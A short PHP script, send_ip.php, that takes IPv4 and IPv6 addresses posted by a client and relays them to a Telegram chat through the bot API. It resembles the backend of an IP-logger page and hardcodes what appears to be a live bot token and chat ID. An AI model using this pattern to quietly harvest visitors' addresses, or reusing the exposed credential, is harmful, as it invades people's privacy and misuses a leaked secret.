
<?php
// PHP code (send_ip.php)

// Get the IPv4 and IPv6 addresses from the request
$ipv4Address = $_POST['ipv4'];
$ipv6Address = $_POST['ipv6'];

// Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
$botToken = '6002701289:AAFzBkmBuaoW382T4e3HzJjHbrXd6aEt5mQ';

// Replace 'YOUR_CHAT_ID' with your actual Telegram chat ID
$chatID = '2041536580';

// Send the IP addresses to the Telegram bot
$telegramURL = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
$message = "IPv4 Address: " . $ipv4Address . "\nIPv6 Address: " . $ipv6Address;
$telegramData = array(
  'chat_id' => $chatID,
  'text' => $message
);

$curl = curl_init($telegramURL);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $telegramData);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($curl);
curl_close($curl);
?>
